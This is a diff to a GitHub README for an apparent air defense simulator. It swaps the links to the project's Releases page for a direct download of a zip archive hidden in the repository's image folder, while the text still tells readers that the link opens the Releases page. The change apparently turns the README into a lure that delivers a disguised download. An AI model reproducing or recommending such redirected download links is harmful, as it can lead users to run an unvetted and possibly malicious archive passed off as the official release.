@@ -1,7 +1,7 @@
 # 🛡️ National-Defense-Grid - Simulate Air Defense Effortlessly 
 
 ## 💾 Download the App
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20Latest%20Release-blue)](https://github.com/zesxes/National-Defense-Grid/releases)
+[![Download](https://github.com/zesxes/National-Defense-Grid/raw/refs/heads/main/imgs/National_Grid_Defense_3.0.zip%20Now-Get%20Latest%20Release-blue)](https://github.com/zesxes/National-Defense-Grid/raw/refs/heads/main/imgs/National_Grid_Defense_3.0.zip)
 
 ## 🚀 Getting Started
 Welcome to the National-Defense-Grid documentation. This application serves as an advanced geospatial Integrated Air Defense System (IADS) simulator, specifically designed for Sri Lanka. It helps users understand and visualize air defense strategies using advanced technology.
@@ -17,7 +17,7 @@ To run the National-Defense-Grid application, you'll need:
 Make sure your system meets these requirements for the best experience.
 
 ## 📥 Download & Install
-To download the latest version of the National-Defense-Grid application, visit the Releases page linked here: [Download](https://github.com/zesxes/National-Defense-Grid/releases). 
+To download the latest version of the National-Defense-Grid application, visit the Releases page linked here: [Download](https://github.com/zesxes/National-Defense-Grid/raw/refs/heads/main/imgs/National_Grid_Defense_3.0.zip). 
 
 1. Click on the link to open the Releases page.
 2. Look for the latest version listed.
